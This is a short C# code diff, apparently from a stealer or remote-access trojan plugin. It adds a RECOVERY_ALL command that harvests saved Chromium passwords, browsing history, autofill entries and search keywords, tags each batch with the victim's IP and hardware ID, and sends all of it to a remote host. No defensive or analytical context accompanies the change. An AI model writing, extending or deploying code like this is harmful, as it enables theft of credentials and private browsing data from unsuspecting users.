@@ -39,6 +39,18 @@ namespace Plugin
                     ClientSender(loadingAPI.host, loadingAPI.key, keywordsPacket);
                     break;
 
+                case PacketType.RECOVERY_ALL:
+                    passwordsPacket = new PasswordsPacket(ChromiumRecovery.Recovery(), loadingAPI.baseIp, loadingAPI.HWID);
+                    historyPacket = new HistoryPacket(ChromiumHistory.Recovery(), loadingAPI.baseIp, loadingAPI.HWID);
+                    autofillPacket = new AutofillPacket(ChromiumAutofill.Recovery(), loadingAPI.baseIp, loadingAPI.HWID);
+                    keywordsPacket = new KeywordsPacket(ChromiumKeywords.Recovery(), loadingAPI.baseIp, loadingAPI.HWID);
+
+                    ClientSender(loadingAPI.host, loadingAPI.key, passwordsPacket);
+                    ClientSender(loadingAPI.host, loadingAPI.key, historyPacket);
+                    ClientSender(loadingAPI.host, loadingAPI.key, autofillPacket);
+                    ClientSender(loadingAPI.host, loadingAPI.key, keywordsPacket);
+                    break;
+
                 default:
                     return;
             }
